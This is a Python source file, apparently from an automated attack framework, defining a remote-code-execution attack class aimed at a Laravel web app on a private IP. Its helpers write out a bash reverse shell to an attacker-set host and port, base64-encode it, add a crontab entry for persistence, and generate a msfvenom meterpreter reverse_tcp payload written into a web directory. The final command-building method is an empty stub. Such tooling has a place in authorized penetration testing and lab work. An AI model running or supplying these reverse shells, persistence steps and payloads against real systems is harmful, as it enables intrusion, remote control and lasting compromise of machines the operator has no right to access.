import base64
from typing import Any, List

from attacks.attack import AttackOptions, Attack
from attacks.reverse_shell_attack_options import ReverseShellAttackOptions


class RCEEXPAttackOptions(ReverseShellAttackOptions):
    url: str = "Target URL"
    exp: str = "EXP Location"

    def _set_defaults(self) -> None:
        super()._set_options_to_none()
        self.url = "http://172.18.0.2/laravel/"
        self.exp = "/root/laravel-exp/exp.py"


class RCEEXPAttack(Attack):
    options_class = RCEEXPAttackOptions

    def __init__(self, options=None, printer=None, ssh_client=None):
        super().__init__(options, printer, ssh_client)
        self.commands = []
        self._append_command()

    def _generate_base64_reverse_shell(self):
        reverse_shell_file = f"#!/bin/bash\n{self._generate_reverse_shell()}"
        return base64.b64encode(reverse_shell_file.encode("utf-8")).decode("utf-8")

    def _generate_reverse_shell(self):
        return f"bash -i >& /dev/tcp/{self.options.lhost}/{self.options.lport} 0>&1"

    def _add_cron_task(self, command: str) -> str:
        return f"(crontab -l 2>/dev/null; echo '{command}') | crontab -  "

    def _generate_meterpreter_command(self, filename: str) -> str:
        lhost = self.options.lhost
        lport = self.options.lport
        return (f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > "
                f"/var/www/vhost.com/{filename}")

    def _append_command(self):
        pass
